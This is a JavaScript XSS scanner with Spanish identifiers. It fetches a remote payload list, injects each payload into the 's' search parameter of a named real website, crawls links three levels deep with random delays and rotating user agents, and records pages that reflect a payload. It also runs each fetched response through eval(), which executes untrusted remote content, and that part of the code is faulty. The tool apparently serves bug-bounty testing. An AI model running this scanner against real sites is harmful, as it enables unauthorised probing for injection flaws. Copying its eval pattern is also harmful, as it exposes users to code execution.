class ComprobadorXSS {
    constructor(baseURL, payloads = null, maxProfundidad = 3) {
        this.baseURL = baseURL;
        this.payloads = payloads;
        this.maxProfundidad = maxProfundidad;
        this.resultadosPositivos = [];
        this.resultadosNegativos = [];
        this.userAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            // Agrega más agentes de usuario según sea necesario
        ];
        this.headers = {
            "User-Agent": this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
            "X-HackerOne-Research": "eltontito@wearehackerone.com"
        };
    }

    async comprobarVulnerabilidadesXSS(url = null, profundidad = 0) {
        if (!url) {
            url = this.baseURL;
        }

        await this._cargarPayloadsDesdeArchivo('https://raw.githubusercontent.com/xaldoxxx/BugHunter001/main/xss_payload.txt');

        for (const payload of this.payloads) {
            const urlModificada = this._modificarURL(url, payload);
            console.log(`Probando URL: ${urlModificada}`);

            try {
                const respuesta = await this._obtenerRespuestaURL(urlModificada);

                if (this._esVulnerableXSS(respuesta, payload)) {
                    const resultado = { url: urlModificada, payload: payload, vulnerable: true };
                    this.resultadosPositivos.push(resultado);
                } else {
                    const resultado = { url: urlModificada, payload: payload, vulnerable: false };
                    this.resultadosNegativos.push(resultado);
                }

                this._imprimirElementosHTML(respuesta);

                const jsCode = `
                    try {
                        ${respuesta}
                    } catch (e) {
                        console.error('Error en la ejecución del código JS:', e);
                    }
                `;
                this._evaluarCodigoJS(jsCode);
            } catch (error) {
                console.error(`Error al conectar al servidor con payload: ${payload} en la URL: ${urlModificada}`, error);
            }

            // Agregar tiempo de espera aleatorio entre 1 y 5 segundos
            await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 4000) + 1000));
        }

        if (profundidad < this.maxProfundidad) {
            await this._explorarEnlaces(url, profundidad + 1);
        }
    }

    _modificarURL(url, payload) {
        const modifiedURL = new URL(url);
        modifiedURL.searchParams.set('s', encodeURIComponent(payload));
        return modifiedURL.href;
    }

    async _obtenerRespuestaURL(url) {
        try {
            const response = await fetch(url, { headers: this.headers });
            return await response.text();
        } catch (error) {
            console.error(`Error al conectar al servidor: ${error}`);
            return null;
        }
    }

    _esVulnerableXSS(respuesta, payload) {
        return respuesta.includes(payload);
    }

    _imprimirElementosHTML(contenidoHTML) {
        const doc = new DOMParser().parseFromString(contenidoHTML, 'text/html');
        const elementos = ['title']; // ['h1', 'h2', 'p']

        elementos.forEach(elemento => {
            const listaElementos = doc.querySelectorAll(elemento);
            console.log(`Elementos ${elemento}:`);
            listaElementos.forEach(item => {
                console.log(item.textContent);
            });
        });
    }

    async _explorarEnlaces(url, profundidad) {
        try {
            const response = await fetch(url);
            const html = await response.text();
            const doc = new DOMParser().parseFromString(html, 'text/html');
            const enlaces = Array.from(doc.querySelectorAll('a[href]')).map(a => new URL(a.href).href);

            for (const enlace of enlaces) {
                await this.comprobarVulnerabilidadesXSS(enlace, profundidad);
            }
        } catch (error) {
            console.error(`Error al conectar al servidor: ${error}`);
        }
    }

    async _cargarPayloadsDesdeArchivo(url) {
        try {
            const response = await fetch(url);
            this.payloads = (await response.text()).split('\n').filter(Boolean);
        } catch (error) {
            console.error(`Error al cargar los payloads desde el archivo: ${error}`);
            this.payloads = [];
        }
    }

    _evaluarCodigoJS(jsCode) {
        try {
            eval(jsCode);
        } catch (error) {
            console.error(`Error al evaluar código JS: ${error}`);
        }
    }

    async guardarResultados() {
        await this._guardarResultadosEnArchivo('resultadosPositivos.json', this.resultadosPositivos);
        await this._guardarResultadosEnArchivo('resultadosNegativos.json', this.resultadosNegativos);
    }

    async _guardarResultadosEnArchivo(nombreArchivo, resultados) {
        try {
            const blob = new Blob([JSON.stringify(resultados, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = nombreArchivo;
            a.click();
        } catch (error) {
            console.error(`Error al guardar los resultados en el archivo: ${error}`);
        }
    }
}

// Uso del código
const url = "https://www.redoxengine.com/?s=";
const comprobadorXSS = new ComprobadorXSS(url);
await comprobadorXSS.comprobarVulnerabilidadesXSS();
await comprobadorXSS.guardarResultados();
